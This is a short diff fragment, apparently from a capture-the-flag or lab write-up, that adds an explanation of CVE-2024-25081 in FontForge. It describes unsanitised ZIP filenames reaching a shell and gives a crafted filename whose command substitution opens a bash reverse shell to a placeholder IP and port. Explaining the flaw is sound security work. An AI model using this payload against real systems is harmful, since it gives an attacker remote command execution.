@@ -406,4 +406,5 @@ drwxrwsr-x 2 www-data www-data 4096 Mar 15 05:21 .
 
 #CVE-2024-25081
 
-
+**How it works:** FontForge processes ZIP archives containing fonts. When it extracts a ZIP, it passes the **filename directly to a shell command without sanitization**. By crafting a ZIP with a malicious filename like:
+$(bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1').ttf
